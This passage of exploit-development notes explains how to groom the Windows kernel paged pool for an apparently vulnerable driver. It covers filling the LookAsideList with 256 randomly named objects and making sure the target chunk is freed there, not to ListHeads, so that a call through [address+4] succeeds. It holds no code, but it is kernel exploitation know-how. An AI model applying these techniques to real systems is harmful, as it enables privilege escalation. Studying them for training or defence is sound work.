     We know that each bucket in LookAsideList can not hold more than 256 free chunks.

     As we are dealing with Named Objects, one of the caveat is, if same static string
     is passed to consecutive calls to Object constructor as Object Name, then only one
     Pool chunk will be served for all the requests. This will not allow us to populate
     LookAsideList and the exploitation will fail.

     To overcome this issue, we need to make sure that the string is random for each call
     to Object constructor.

     So, to populate the LookAsideList, allocate 256 objects of same size and then free them.

         This is a very interesting bug. At first, it seems to be a very easy bug to exploit.
         However, we need to solve some challenges.

         Challenges
            1. Grooming Paged Pool (4 Paged Pool in Uniprocessor System)
            2. Preparing Target Pool Chunk with controlled data

         We know that vulnerability is like call [address + 4]. So, this is very important
         for exploitation. As we know that when a pool chunk is freed to ListHeads, POOL_HEADER
         is immediately followed by LIST_ENTRY structure which is used to track the pool chunk.

         If you remember, LIST_ENTRY is of 8 bytes. Hence, if the Pool chunk is freed to ListHeads
         then the exploitation will fail as call [LIST_ENTRY.Blink] will throw an exception.

         For successful exploitation, the target pool chunk should be freed to LookAsideList because
         chunks in LookAsideList are tracked using SLIST_ENTRY which has only one member.
